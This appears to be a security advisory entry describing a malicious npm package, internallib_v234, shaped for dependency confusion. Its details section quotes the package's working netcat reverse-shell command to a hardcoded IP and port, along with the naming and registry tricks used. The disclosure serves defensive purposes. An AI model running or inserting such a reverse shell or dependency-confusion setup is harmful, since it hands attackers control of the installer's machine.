summary: Reverse shell to hardcoded internal IP in dependency-confusion-shaped package
details: internallib_v234@1.0.5 ships an index.js whose exported `command` function spawns `/bin/bash -c "nc -vn 10.0.74.133 13337 -e /bin/bash"`, handing an interactive shell on the installer's machine to a listener at the hardcoded RFC1918 address 10.0.74.133:13337. Package metadata reinforces the attack shape: an internal-sounding name (`internallib_v234`), a self-referential dependency on `internallib_v234`, and a `.gitlab-ci.yml` pointing npm at a local Verdaccio-style registry (`http://0.0.0.0:4873/`) — the standard fingerprint of a dependency-confusion payload intended to be pulled from public npm by an internal build system that also resolves the private name. Any consumer that requires this package and invokes the exported function yields shell access to the listener.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
